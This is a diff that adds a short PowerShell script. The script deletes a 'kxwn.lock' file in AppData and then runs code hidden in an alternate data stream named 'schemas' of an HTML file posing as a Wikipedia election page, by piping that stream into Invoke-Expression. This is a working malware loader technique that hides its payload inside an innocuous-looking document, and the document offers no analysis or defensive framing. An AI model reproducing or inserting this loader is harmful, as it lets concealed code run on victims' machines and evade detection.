@@ -1,0 +1,8 @@
+Set-Location -Path "C:\Users\Administrator\Desktop";
+
+if(Test-Path -LiteralPath "$env:appdata\Microsoft\kxwn.lock"){
+  Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+  Write-Host "Removed old kxwn.lock file";
+}
+
+powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
